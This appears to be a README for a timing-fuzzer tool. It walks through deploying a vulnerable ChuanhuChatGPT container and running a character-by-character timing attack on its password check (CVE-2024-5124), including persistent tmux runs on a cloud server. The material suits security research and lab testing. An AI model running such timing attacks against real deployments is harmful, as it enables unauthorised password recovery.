## I Tutorials:

# I.1/ Install dependencies

```bash
virtualenv -p python3 venv3 ;
source venv3/bin/activate &&

pip install argparse requests matplotlib scipy pandas
```

# I.2/ Install modular-time-fuzzer

```
python3 -m pip install build && 
python3 -m build &&
python3 -m pip install -e . &&
python3 -m pip install dist/modular_time_fuzzer_GOGO-0.0.1-py3-none-any.whl --force-reinstall
```

# I.3/ Usage

```bash
measure -r 10 -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z "out.sqlite"
analyze -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z "out.sqlite"
```

## II How-to:

# II.1/ developping timing attack against the password verification of Chuanchuangpt (CVE-2024-5124) using a cloud service in background

# II.1.1/ Deploy victim server:

# Install docker

```bash
# Install packages required for the installation

sudo apt-get update
sudo apt install --yes ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

# Add the repository to Apt sources:

echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \
  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update
# Download GPG key and store repository in the system

curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor -o /usr/share/keyrings/docker.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" |tee /etc/apt/sources.list.d/docker.list > /dev/null 
apt update 

# Install Docker packages

sudo apt install --yes docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

# Run victim server

```bash
export JSON='{
    "users": [["openai", "isCloseAi"]]
}' ;

export DOCKER_CMD="apt update && apt install --yes git && pip install itsdangerous gradio && echo '${JSON}' > config.json && sed -i 's/share=share/share=True/g' ChuanhuChatbot.py && python3 -u ChuanhuChatbot.py 2>&1 | tee /var/log/application.log"

export DOCKER_RUN='sudo docker run -e language=en_US -it tuchuanhuhuhu/chuanhuchatgpt:20240310 /bin/bash -c "${DOCKER_CMD}"'

tmux new-session -d -s persistent_server "${DOCKER_RUN}"
tmux attach -t persistent_server
```

## II.1.2/ Attack the victim server

If you want to run these two scripts

```bash
measure -r 1000 -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z "out.sqlite"
analyze -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z "out.sqlite"
```

On a cloud backend to ensure it will never exit, install previously mentionned dependencies and run:

```bash
tmux new-session -d -s persistent_session "rm -Rf tmpdir/ && mkdir tmpdir/ ; pmeasure -r 1000 -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z 'out.sqlite' && analyze -c a -c b -c c -c d -c e -c f -c g -c h -c i -c j -c k -c l -c m -c n -c o -c p -c q -c r -c s -c t -c u -c v -c w -c x -c y -c z 'out.sqlite'"
tmux attach -t persistent_session
```


